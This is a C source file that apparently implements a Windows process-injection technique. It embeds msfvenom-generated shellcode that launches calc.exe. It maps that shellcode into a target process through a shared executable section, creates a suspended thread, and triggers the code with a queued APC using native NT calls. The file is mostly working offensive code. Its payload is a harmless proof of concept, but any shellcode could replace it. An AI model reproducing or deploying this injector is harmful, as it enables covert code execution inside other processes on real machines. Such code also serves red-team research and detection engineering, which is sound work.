#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winternl.h>
#include "definitions.h"

// msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -f c 
unsigned char payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

int main( int argc, char *argv[] )
{

    /*   Check for PID argument   */
    if( argc < 2 ) {
        printf( "[*] Missing PID of remote process\n" );
        exit( 1 );
    }

    /*   Get the PID of the process to inject into   */
    DWORD64 dwPid = (DWORD64)atoi( argv[1] );

    HANDLE hTargetProcess                = INVALID_HANDLE_VALUE;
    CLIENT_ID_R cidClientId              = { 0 };
    cidClientId.UniqueProcess            = (PDWORD64)dwPid;
    OBJECT_ATTRIBUTES oaObjectAttributes;

    memset( &oaObjectAttributes, 0, sizeof( OBJECT_ATTRIBUTES ) );

    /*   Open a handle to the remote process   */
    NTSTATUS ntCallResult = NtOpenProcess( &hTargetProcess, PROCESS_ALL_ACCESS, &oaObjectAttributes, &cidClientId );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] Failed to get handle to process" );
        exit(1);
    }
    printf( "%-20s 0x%p\n", "hTargetProcess:", hTargetProcess );

    /*   Check if process is WOW64 (32-bit)   */
    ULONG isWow64 = 0;
    UINT RetLen   = 0;
    NtQueryInformationProcess( hTargetProcess, ProcessWow64Information, &isWow64, sizeof(isWow64), &RetLen );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtQueryInformationProcess failed with error %x\n", ntCallResult );
        exit(1);
    }
    printf( "%-20s %d\n", "isWow64:", isWow64 );

    /*   Create a section in the local process   */
    HANDLE hSection = INVALID_HANDLE_VALUE;
    LARGE_INTEGER lnSectionSize;
    lnSectionSize.HighPart = 0;
	lnSectionSize.LowPart = 0x1000;
    ntCallResult = NtCreateSection( &hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                                    NULL, &lnSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtCreateSection failed with error %x\n", ntCallResult );
        exit(1);
    }
    printf( "%-20s 0x%p\n", "hSection:", hSection );

    /*   Map a view of the section in the local process   */
    PVOID lpLocalSection = NULL;
    SIZE_T nViewSize = 0;
    DWORD dwInheritDisposition = 1;
    ntCallResult = NtMapViewOfSection( hSection, INVALID_HANDLE_VALUE, &lpLocalSection, (ULONG_PTR)NULL, 0, NULL,
                                       &nViewSize, dwInheritDisposition, 0, PAGE_READWRITE );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtMapViewOfSection failed with error %x\n", ntCallResult );
        exit(1);
    }
    printf( "%-20s 0x%p\n", "lpLocalSection:", lpLocalSection );

    /*   Copy payload to local view, which will be reflected in remote process's mapped view   */
    memcpy( lpLocalSection, payload, sizeof( payload ) );

    /*   Map a view of the section in the remote process   */
    PVOID lpRemoteSection = NULL;
    ntCallResult = NtMapViewOfSection( hSection, hTargetProcess, &lpRemoteSection, (ULONG_PTR)NULL, 0, NULL, &nViewSize, 
                                       dwInheritDisposition, 0, PAGE_EXECUTE_READWRITE );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtMapViewOfSection failed with error %x\n", ntCallResult );
        exit(1);
    }                        
    printf( "%-20s 0x%p\n", "lpRemoteSection:", lpRemoteSection );

    /*   Unmap the local section since we're done with it   */
    ntCallResult = NtUnmapViewOfSection( INVALID_HANDLE_VALUE, lpLocalSection );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtUnmapViewOfSection failed with error %x\n", ntCallResult );
        exit(1);
    } 

    HANDLE hModule = INVALID_HANDLE_VALUE;
    UNICODE_STRING uModuleName;
    ANSI_STRING aFuncName;
    PVOID pRemoteFunction = NULL;

    /*   Create Unicode string for function call   */
    RtlInitUnicodeString( &uModuleName, L"ntdll.dll" );

    /*   Get handle to ntdll.dll   */
    ntCallResult = LdrGetDllHandle( NULL, NULL, &uModuleName, &hModule );
    printf( "%-20s 0x%p\n", "hModule:", hModule );
    
    /*   Create an ANSI string for LdrGetProcedureAddress call   */
    RtlInitAnsiString( &aFuncName, "RtlExitUserThread" );

    /*   Get the address of RtlExitUserThread (same in both local and remote process)   */
    ntCallResult = LdrGetProcedureAddress( hModule,  &aFuncName, 0, &pRemoteFunction );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] LdrGetProcedureAddress failed with error %x\n", ntCallResult );
        exit(1);
    }  
    printf( "%-20s 0x%p\n", "pRemoteFunction:", pRemoteFunction );

    /*   Create a remote thread at the remote address of RtlExitUserThread   */
    HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
    ntCallResult = NtCreateThreadEx( &hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hTargetProcess, 
                                     (LPTHREAD_START_ROUTINE)pRemoteFunction, NULL, true, 0, 0xffff, 0xffff, NULL );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtCreateThreadEx failed with error %x\n", ntCallResult );
        exit(1);
    }    
    printf( "%-20s 0x%p\n", "hRemoteThread:", hRemoteThread );

    /*   Queue an APC on the remote thread pointing to the mapped remote section   */
    ntCallResult = NtQueueApcThread( hRemoteThread, (PIO_APC_ROUTINE)lpRemoteSection, NULL, NULL, (ULONG_PTR)NULL );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtQueueApcThread failed with error %x\n", ntCallResult );
        exit(1);
    }

    /*   Alert the thread to begin execution   */
    UINT SuspendCount = 0;
    ntCallResult = NtAlertResumeThread( hRemoteThread, &SuspendCount );
    if( !NT_SUCCESS( ntCallResult ) ) {
        printf( "[!] NtAlertResumeThread failed with error %x\n", ntCallResult );
        exit(1);
    }

    return 0;
}